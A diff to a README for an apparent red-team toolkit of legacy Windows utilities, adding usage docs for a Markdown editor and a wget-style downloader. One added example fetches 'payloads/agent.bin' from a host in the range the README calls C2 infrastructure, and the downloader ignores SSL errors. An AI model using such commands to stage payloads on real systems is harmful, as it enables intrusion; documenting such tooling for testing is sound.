@@ -270,6 +270,9 @@ All binaries are built to `windows/`. Build all at once with `./build-c2.sh`, or
 | `grid.exe` | Win32s / NT / 95 | TCP port scanner |
 | `ipcalc32.exe` | Win32s / NT / 95 | Subnet calculator |
 | `ipcalc16.exe` | Win 3.1 / WFW 3.11 | Subnet calculator (16-bit) |
+| `markuped.exe` | Win32s / NT / 95 | Markdown editor (split-pane, live preview) |
+| `wget.exe` | Win32s / NT / 95 | Command-line HTTP/HTTPS/FTP downloader |
+| `wget16.exe` | Win 3.1 / WFW 3.11 | Command-line HTTP downloader (16-bit) |
 
 > All examples below use `example.com` as the target host, `169.254.69.0/24` as the target LAN, and `172.16.93.0/16` as the C2 infrastructure range. Neither subnet is internet-routable.
 
@@ -395,6 +398,76 @@ rem   APIPA / link-local (RFC 3927)
 
 ---
 
+### markuped.exe — Markdown Editor
+
+Split-pane Markdown editor with live preview. Left pane is the raw source; right pane renders headers, bold/italic, inline code, fenced code blocks, blockquotes, lists, horizontal rules, and hyperlinks. A draggable splitter adjusts the pane ratio. Preview updates 500 ms after each keystroke.
+
+```bat
+rem Open the editor (blank document)
+markuped.exe
+
+rem Open a specific file directly
+markuped.exe C:\NOTES\REPORT.MD
+```
+
+**Toolbar / keyboard shortcuts:**
+
+| Button | Action | Shortcut |
+|--------|--------|---------|
+| New | New document | Ctrl+N |
+| Open | Open .md / .txt | Ctrl+O |
+| Save | Save | Ctrl+S |
+| B | Wrap selection in `**bold**` | Ctrl+B |
+| I | Wrap selection in `*italic*` | Ctrl+I |
+| H1 / H2 / H3 | Prefix current line with `#` / `##` / `###` | — |
+| `` ` `` | Wrap selection in `` `code` `` | — |
+| ` ``` ` | Insert fenced code block | — |
+| > | Prefix current line with `> ` (blockquote) | — |
+| --- | Insert horizontal rule | — |
+| - | Prefix current line with `- ` (list item) | — |
+| — | Toggle preview pane | Ctrl+P |
+
+All Format operations are also in the Format menu. File operations in the File menu. Edit menu provides Undo/Cut/Copy/Paste/Select All.
+
+---
+
+### wget.exe / wget16.exe — File Downloader
+
+Command-line HTTP/HTTPS/FTP downloader. When launched from `cmd.exe` or `command.com`, progress is written to stderr. When launched from Program Manager, a small GUI window shows URL, filename, progress bar, and a Stop button.
+
+```bat
+rem Download a file over HTTP
+wget.exe http://example.com/files/tools.zip
+
+rem Download and save with a specific name
+wget.exe http://172.16.93.1/payloads/agent.bin -O C:\TEMP\AGENT.BIN
+
+rem Download over HTTPS (requires WININET.DLL — IE 3+)
+wget.exe https://example.com/report.pdf -O REPORT.PDF
+
+rem Quiet mode — no progress output
+wget.exe http://172.16.93.1/data.dat -O DATA.DAT -q
+
+rem FTP (anonymous login, binary transfer)
+wget.exe ftp://172.16.93.1/pub/toolkit.zip
+```
+
+`wget16.exe` is the Win16 build. HTTP only — no HTTPS or FTP. Loads `WINSOCK.DLL` dynamically, so it works on any WFW 3.11 / Win 3.1 installation that has a Winsock stack.
+
+```bat
+rem Win16 HTTP download
+wget16.exe http://172.16.93.1/pkg.zip -O PKG.ZIP
+```
+
+**Options:**
+
+| Flag | Description |
+|------|-------------|
+| `-O <file>` | Output filename (default: derived from URL path) |
+| `-q` | Quiet — suppress progress output / GUI window |
+
+---
+
 ## Grid — Port Scanner
 
 `windows/grid.c` — Win32s/Win32 TCP connect scanner. GUI subsystem, async select-pool, no threads; runs on Win32s and WFW 3.11 through Windows NT 4.
@@ -490,6 +563,9 @@ nmap data files are GPL-licensed. See https://nmap.org/book/man-legal.html
 | **Grid** | `windows/grid.c` | Win32s/Win32 port scanner. GUI subsystem, async select-pool (no threads), Winsock 1.1. CIDR/range targets, per-port service lookup from SERVICES.DAT, optional banner grab, tab-delimited parseable output when redirected, results window on Win32s. |
 | **ipcalc32** | `windows/ipcalc.c` | Win32s/Win32 subnet calculator. Network/broadcast/host range, class, RFC 1918 / APIPA / multicast flags. CLI-scriptable; `-o file` writes results to disk; stdout when redirected. |
 | **ipcalc16** | `windows/ipcalc.c` | Win16 subnet calculator (same source as ipcalc32). Runs on Windows 3.1 / WFW 3.11. Identical CLI and output. |
+| **markuped** | `windows/markuped.c` | Win32s/Win32 Markdown editor. Split-pane (source + live preview), toolbar, menus, inline bold/italic/code rendering, fenced code blocks, blockquotes, lists, HR. Draggable splitter, 500 ms debounced refresh. comdlg32 for file dialogs. |
+| **wget** | `windows/wget.c` | Win32s/Win32 HTTP/HTTPS/FTP downloader. WinInet dynamically loaded for HTTPS/FTP (ignores SSL errors); raw socket fallback for plain HTTP when WinInet absent. GUI progress window or stderr progress in console mode. |
+| **wget16** | `windows/wget.c` | Win16 HTTP downloader (same source as wget). WINSOCK.DLL loaded dynamically. HTTP only; no HTTPS/FTP. GUI MessageBox completion notification. |
 
 ### Icons
 
@@ -504,6 +580,8 @@ All icons (32×32 + 16×16, 4bpp Windows VGA palette) generated from source imag
 | `windows/reco.ico` | `icons/RECO.webp` | (available) |
 | `windows/grid.ico` | `icons/grid.png` | grid.exe |
 | `windows/ipcalc.ico` | `icons/ipcalc.png` | ipcalc32.exe, ipcalc16.exe |
+| `windows/markuped.ico` | `icons/markuped.png` | markuped.exe |
+| `windows/wget.ico` | `icons/wget.png` | wget.exe, wget16.exe |
 
 ---
 
